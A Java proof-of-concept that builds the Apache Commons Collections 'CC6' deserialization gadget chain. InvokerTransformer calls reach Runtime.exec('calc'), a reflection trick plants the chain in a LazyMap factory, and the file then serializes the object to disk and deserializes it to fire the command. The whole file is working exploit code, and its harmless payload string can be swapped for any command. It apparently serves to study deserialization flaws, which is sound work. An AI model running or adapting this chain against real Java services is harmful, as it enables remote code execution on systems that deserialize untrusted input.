package org.example;

import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.keyvalue.TiedMapEntry;
import org.apache.commons.collections.map.HashedMap;
import org.apache.commons.collections.map.LazyMap;

import java.io.*;
import java.lang.reflect.Field;
import java.nio.charset.StandardCharsets;
import java.util.Base64;

import java.util.HashMap;
import java.util.Map;

public class CC6 {
    public static void main(String[] args) throws  Exception{
        Transformer[] transformers=new Transformer[] {
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer("getDeclaredMethod", new Class[]{String.class, Class[].class}, new Object[]{"getRuntime", null}),
                new InvokerTransformer("invoke", new Class[]{Object.class, Object[].class}, new Object[]{null, null}),
                new InvokerTransformer("exec", new Class[]{String.class}, new Object[]{"calc"})
        };
        ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);
        HashedMap map=new HashedMap();
        map.put("value","cc1");
        Map<Object,Object> lazyMap= LazyMap.decorate(map,new ConstantTransformer(1));

        TiedMapEntry tiedMapEntry=new TiedMapEntry(lazyMap,"aaa");
        Map o = new HashMap();
        o.put(tiedMapEntry,"bbb");
        lazyMap.remove("aaa");
        Field factoryField = LazyMap.class.getDeclaredField("factory");
        factoryField.setAccessible(true);
        factoryField.set(lazyMap,chainedTransformer);
//base64
//        ByteArrayOutputStream buffer=new ByteArrayOutputStream();
//        ObjectOutputStream objectOutputStream=new ObjectOutputStream(buffer);
//        objectOutputStream.writeObject(o);
//        String data = Base64.getEncoder().encodeToString(buffer.toByteArray());
//        System.out.println(data);
////
//        byte[] bytes=Base64.getDecoder().decode(data.getBytes(StandardCharsets.UTF_8));
//        ByteArrayInputStream b = new ByteArrayInputStream(bytes);
//        ObjectInputStream input = new ObjectInputStream(b);
//        input.readObject();
        // 写文件
//        //序列化
        ObjectOutputStream objectOutputStream=new ObjectOutputStream(new FileOutputStream("./cc1.txt"));
        objectOutputStream.writeObject(o);
        objectOutputStream.close();
//        //反序列化
        ObjectInputStream objectInputStream=new ObjectInputStream(new FileInputStream("./cc1.txt"));
        objectInputStream.readObject();
    }
}
